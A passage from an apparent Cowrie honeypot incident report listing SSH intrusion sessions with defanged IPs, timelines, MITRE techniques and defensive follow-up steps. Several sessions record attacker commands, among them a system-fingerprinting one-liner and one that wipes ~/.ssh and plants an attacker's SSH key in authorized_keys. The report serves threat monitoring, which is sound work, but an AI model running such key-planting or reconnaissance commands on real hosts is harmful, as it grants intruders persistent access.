| `2026-07-25 09:53:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2918a1e62f3

| Field | Detail |
|---|---|
| **Source IP** | `116.99.172[.]197` |
| **First Seen** | 2026-07-25 09:54 |
| **Last Seen** | 2026-07-25 09:55 |
| **Session Duration** | 103s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:54:03` | `cowrie.session.connect` |
| `2026-07-25 09:54:03` | `cowrie.client.version` |
| `2026-07-25 09:54:52` | `cowrie.client.kex` |
| `2026-07-25 09:54:58` | `cowrie.login.success` |
| `2026-07-25 09:55:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.172[.]197` to AbuseIPDB if not already reported
- [ ] Block `116.99.172[.]197` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-862f550551ab

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:54 |
| **Last Seen** | 2026-07-25 09:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:54:41` | `cowrie.session.connect` |
| `2026-07-25 09:54:41` | `cowrie.client.version` |
| `2026-07-25 09:54:41` | `cowrie.client.kex` |
| `2026-07-25 09:54:42` | `cowrie.login.success` |
| `2026-07-25 09:54:43` | `cowrie.session.params` |
| `2026-07-25 09:54:43` | `cowrie.command.input` |
| `2026-07-25 09:54:43` | `cowrie.command.input` |
| `2026-07-25 09:54:43` | `cowrie.command.input` |
| `2026-07-25 09:54:43` | `cowrie.command.input` |
| `2026-07-25 09:54:43` | `cowrie.command.input` |
| `2026-07-25 09:54:43` | `cowrie.command.success` |
| `2026-07-25 09:54:43` | `cowrie.command.input` |
| `2026-07-25 09:54:43` | `cowrie.command.input` |
| `2026-07-25 09:54:43` | `cowrie.command.input` |
| `2026-07-25 09:54:43` | `cowrie.command.input` |
| `2026-07-25 09:54:44` | `cowrie.log.closed` |
| `2026-07-25 09:54:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-238ebec17104

| Field | Detail |
|---|---|
| **Source IP** | `95.79.57[.]221` |
| **First Seen** | 2026-07-25 09:54 |
| **Last Seen** | 2026-07-25 09:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:54:48` | `cowrie.session.connect` |
| `2026-07-25 09:54:48` | `cowrie.client.version` |
| `2026-07-25 09:54:48` | `cowrie.client.kex` |
| `2026-07-25 09:54:49` | `cowrie.login.success` |
| `2026-07-25 09:54:50` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:54:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.79.57[.]221` to AbuseIPDB if not already reported
- [ ] Block `95.79.57[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e99ae03a4613

| Field | Detail |
|---|---|
| **Source IP** | `129.121.75[.]215` |
| **First Seen** | 2026-07-25 09:54 |
| **Last Seen** | 2026-07-25 09:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:54:57` | `cowrie.session.connect` |
| `2026-07-25 09:54:57` | `cowrie.client.version` |
| `2026-07-25 09:54:57` | `cowrie.client.kex` |
| `2026-07-25 09:54:57` | `cowrie.login.success` |
| `2026-07-25 09:54:57` | `cowrie.session.params` |
| `2026-07-25 09:54:57` | `cowrie.command.input` |
| `2026-07-25 09:54:57` | `cowrie.command.failed` |
| `2026-07-25 09:54:57` | `cowrie.log.closed` |
| `2026-07-25 09:54:58` | `cowrie.session.params` |
| `2026-07-25 09:54:58` | `cowrie.command.input` |
| `2026-07-25 09:54:58` | `cowrie.session.file_download` |
| `2026-07-25 09:54:58` | `cowrie.log.closed` |
| `2026-07-25 09:54:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.75[.]215` to AbuseIPDB if not already reported
- [ ] Block `129.121.75[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-250101fe4c3e

| Field | Detail |
|---|---|
| **Source IP** | `129.121.75[.]215` |
| **First Seen** | 2026-07-25 09:54 |
| **Last Seen** | 2026-07-25 09:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:54:58` | `cowrie.session.connect` |
| `2026-07-25 09:54:58` | `cowrie.client.version` |
| `2026-07-25 09:54:58` | `cowrie.client.kex` |
| `2026-07-25 09:54:58` | `cowrie.login.success` |
| `2026-07-25 09:54:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.75[.]215` to AbuseIPDB if not already reported
- [ ] Block `129.121.75[.]215` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bf1def1f88f

| Field | Detail |
|---|---|
| **Source IP** | `129.121.75[.]215` |
| **First Seen** | 2026-07-25 09:54 |
| **Last Seen** | 2026-07-25 09:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:54:58` | `cowrie.session.connect` |
| `2026-07-25 09:54:58` | `cowrie.client.version` |
| `2026-07-25 09:54:58` | `cowrie.client.kex` |
| `2026-07-25 09:54:58` | `cowrie.login.success` |
| `2026-07-25 09:54:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.75[.]215` to AbuseIPDB if not already reported
- [ ] Block `129.121.75[.]215` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41e94399a334

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]251` |
| **First Seen** | 2026-07-25 09:55 |
| **Last Seen** | 2026-07-25 09:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:55:32` | `cowrie.session.connect` |
| `2026-07-25 09:55:32` | `cowrie.client.version` |
| `2026-07-25 09:55:33` | `cowrie.client.kex` |
| `2026-07-25 09:55:35` | `cowrie.login.success` |
| `2026-07-25 09:55:37` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:55:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-25 09:55:37` | `cowrie.direct-tcpip.data` |
| `2026-07-25 09:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-123d935650b8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:56 |
| **Last Seen** | 2026-07-25 09:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:56:36` | `cowrie.session.connect` |
| `2026-07-25 09:56:36` | `cowrie.client.version` |
| `2026-07-25 09:56:36` | `cowrie.client.kex` |
| `2026-07-25 09:56:37` | `cowrie.login.success` |
| `2026-07-25 09:56:39` | `cowrie.session.params` |
| `2026-07-25 09:56:39` | `cowrie.command.input` |
| `2026-07-25 09:56:39` | `cowrie.command.input` |
| `2026-07-25 09:56:39` | `cowrie.command.input` |
| `2026-07-25 09:56:39` | `cowrie.command.input` |
| `2026-07-25 09:56:39` | `cowrie.command.input` |
| `2026-07-25 09:56:39` | `cowrie.command.success` |
| `2026-07-25 09:56:39` | `cowrie.command.input` |
| `2026-07-25 09:56:39` | `cowrie.command.input` |
| `2026-07-25 09:56:39` | `cowrie.command.input` |
| `2026-07-25 09:56:39` | `cowrie.command.input` |
| `2026-07-25 09:56:39` | `cowrie.log.closed` |
| `2026-07-25 09:56:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a251e93bfb33

| Field | Detail |
|---|---|
| **Source IP** | `177.72.87[.]7` |
| **First Seen** | 2026-07-25 09:56 |
| **Last Seen** | 2026-07-25 09:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:56:50` | `cowrie.session.connect` |
| `2026-07-25 09:56:51` | `cowrie.client.version` |
| `2026-07-25 09:56:51` | `cowrie.client.kex` |
| `2026-07-25 09:56:53` | `cowrie.login.success` |
| `2026-07-25 09:56:53` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.72.87[.]7` to AbuseIPDB if not already reported
- [ ] Block `177.72.87[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e77d08003f99

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:58 |
| **Last Seen** | 2026-07-25 09:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:58:27` | `cowrie.session.connect` |
| `2026-07-25 09:58:27` | `cowrie.client.version` |
| `2026-07-25 09:58:27` | `cowrie.client.kex` |
| `2026-07-25 09:58:29` | `cowrie.login.success` |
| `2026-07-25 09:58:30` | `cowrie.session.params` |
| `2026-07-25 09:58:30` | `cowrie.command.input` |
| `2026-07-25 09:58:30` | `cowrie.command.input` |
| `2026-07-25 09:58:30` | `cowrie.command.input` |
| `2026-07-25 09:58:30` | `cowrie.command.input` |
| `2026-07-25 09:58:30` | `cowrie.command.input` |
| `2026-07-25 09:58:30` | `cowrie.command.success` |
| `2026-07-25 09:58:30` | `cowrie.command.input` |
| `2026-07-25 09:58:30` | `cowrie.command.input` |
| `2026-07-25 09:58:30` | `cowrie.command.input` |
| `2026-07-25 09:58:30` | `cowrie.command.input` |
| `2026-07-25 09:58:30` | `cowrie.log.closed` |
| `2026-07-25 09:58:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b1125e74af3

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]251` |
| **First Seen** | 2026-07-25 09:58 |
| **Last Seen** | 2026-07-25 09:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:58:28` | `cowrie.session.connect` |
| `2026-07-25 09:58:28` | `cowrie.client.version` |
| `2026-07-25 09:58:28` | `cowrie.client.kex` |
| `2026-07-25 09:58:30` | `cowrie.login.success` |
| `2026-07-25 09:58:31` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:58:31` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-25 09:58:31` | `cowrie.direct-tcpip.data` |
| `2026-07-25 09:58:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdce46a76e0b

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]251` |
| **First Seen** | 2026-07-25 10:00 |
| **Last Seen** | 2026-07-25 10:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:00:06` | `cowrie.session.connect` |
| `2026-07-25 10:00:06` | `cowrie.client.version` |
| `2026-07-25 10:00:07` | `cowrie.client.kex` |
| `2026-07-25 10:00:08` | `cowrie.login.success` |
| `2026-07-25 10:00:08` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:00:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-25 10:00:08` | `cowrie.direct-tcpip.data` |
| `2026-07-25 10:00:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cc5e8bc700c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:00 |
| **Last Seen** | 2026-07-25 10:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:00:20` | `cowrie.session.connect` |
| `2026-07-25 10:00:21` | `cowrie.client.version` |
| `2026-07-25 10:00:21` | `cowrie.client.kex` |
| `2026-07-25 10:00:22` | `cowrie.login.success` |
| `2026-07-25 10:00:23` | `cowrie.session.params` |
| `2026-07-25 10:00:23` | `cowrie.command.input` |
| `2026-07-25 10:00:23` | `cowrie.command.input` |
| `2026-07-25 10:00:23` | `cowrie.command.input` |
| `2026-07-25 10:00:23` | `cowrie.command.input` |
| `2026-07-25 10:00:23` | `cowrie.command.input` |
| `2026-07-25 10:00:23` | `cowrie.command.success` |
| `2026-07-25 10:00:23` | `cowrie.command.input` |
| `2026-07-25 10:00:23` | `cowrie.command.input` |
| `2026-07-25 10:00:23` | `cowrie.command.input` |
| `2026-07-25 10:00:23` | `cowrie.command.input` |
| `2026-07-25 10:00:24` | `cowrie.log.closed` |
| `2026-07-25 10:00:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb23bede26dc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:02 |
| **Last Seen** | 2026-07-25 10:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:02:22` | `cowrie.session.connect` |
| `2026-07-25 10:02:22` | `cowrie.client.version` |
| `2026-07-25 10:02:22` | `cowrie.client.kex` |
| `2026-07-25 10:02:23` | `cowrie.login.success` |
| `2026-07-25 10:02:25` | `cowrie.session.params` |
| `2026-07-25 10:02:25` | `cowrie.command.input` |
| `2026-07-25 10:02:25` | `cowrie.command.input` |
| `2026-07-25 10:02:25` | `cowrie.command.input` |
| `2026-07-25 10:02:25` | `cowrie.command.input` |
| `2026-07-25 10:02:25` | `cowrie.command.input` |
| `2026-07-25 10:02:25` | `cowrie.command.success` |
| `2026-07-25 10:02:25` | `cowrie.command.input` |
| `2026-07-25 10:02:25` | `cowrie.command.input` |
| `2026-07-25 10:02:25` | `cowrie.command.input` |
| `2026-07-25 10:02:25` | `cowrie.command.input` |
| `2026-07-25 10:02:25` | `cowrie.log.closed` |
| `2026-07-25 10:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2edc8b5a840

| Field | Detail |
|---|---|
| **Source IP** | `116.99.172[.]197` |
| **First Seen** | 2026-07-25 10:02 |
| **Last Seen** | 2026-07-25 10:04 |
| **Session Duration** | 110s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:02:48` | `cowrie.session.connect` |
| `2026-07-25 10:02:48` | `cowrie.client.version` |
| `2026-07-25 10:03:39` | `cowrie.client.kex` |
| `2026-07-25 10:03:48` | `cowrie.login.success` |
| `2026-07-25 10:04:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.172[.]197` to AbuseIPDB if not already reported
- [ ] Block `116.99.172[.]197` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-349d00f1d02b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:04 |
| **Last Seen** | 2026-07-25 10:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:04:24` | `cowrie.session.connect` |
| `2026-07-25 10:04:24` | `cowrie.client.version` |
| `2026-07-25 10:04:24` | `cowrie.client.kex` |
| `2026-07-25 10:04:25` | `cowrie.login.success` |
| `2026-07-25 10:04:26` | `cowrie.session.params` |
| `2026-07-25 10:04:26` | `cowrie.command.input` |
| `2026-07-25 10:04:26` | `cowrie.command.input` |
| `2026-07-25 10:04:26` | `cowrie.command.input` |
| `2026-07-25 10:04:26` | `cowrie.command.input` |
| `2026-07-25 10:04:26` | `cowrie.command.input` |
| `2026-07-25 10:04:26` | `cowrie.command.success` |
| `2026-07-25 10:04:26` | `cowrie.command.input` |
| `2026-07-25 10:04:26` | `cowrie.command.input` |
| `2026-07-25 10:04:26` | `cowrie.command.input` |
| `2026-07-25 10:04:26` | `cowrie.command.input` |
| `2026-07-25 10:04:26` | `cowrie.log.closed` |
| `2026-07-25 10:04:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-454bbc5fd3f0

| Field | Detail |
|---|---|
| **Source IP** | `116.99.172[.]197` |
| **First Seen** | 2026-07-25 10:04 |
| **Last Seen** | 2026-07-25 10:06 |
| **Session Duration** | 98s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:04:53` | `cowrie.session.connect` |
| `2026-07-25 10:04:53` | `cowrie.client.version` |
| `2026-07-25 10:04:53` | `cowrie.client.kex` |
| `2026-07-25 10:05:20` | `cowrie.login.success` |
| `2026-07-25 10:06:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.172[.]197` to AbuseIPDB if not already reported
- [ ] Block `116.99.172[.]197` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9a0e4d1e11d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-25 10:05 |
| **Last Seen** | 2026-07-25 10:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:05:36` | `cowrie.session.connect` |
| `2026-07-25 10:05:36` | `cowrie.client.version` |
| `2026-07-25 10:05:36` | `cowrie.client.kex` |
| `2026-07-25 10:05:37` | `cowrie.login.success` |
| `2026-07-25 10:05:37` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:05:37` | `cowrie.direct-tcpip.ja4` |
| `2026-07-25 10:05:37` | `cowrie.direct-tcpip.data` |
| `2026-07-25 10:05:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

